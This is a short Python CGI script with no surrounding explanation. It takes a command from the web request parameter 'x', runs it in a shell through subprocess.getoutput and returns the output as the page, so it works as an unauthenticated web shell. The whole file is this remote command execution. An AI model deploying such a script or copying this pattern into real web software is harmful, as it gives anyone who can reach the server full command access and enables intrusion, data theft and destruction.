#!/usr/bin/python3

print("content-type:text/html\n")
print()

import cgi
import subprocess

form=cgi.FieldStorage()
cmd=form.getvalue("x")

output=subprocess.getoutput(cmd)
print(output)
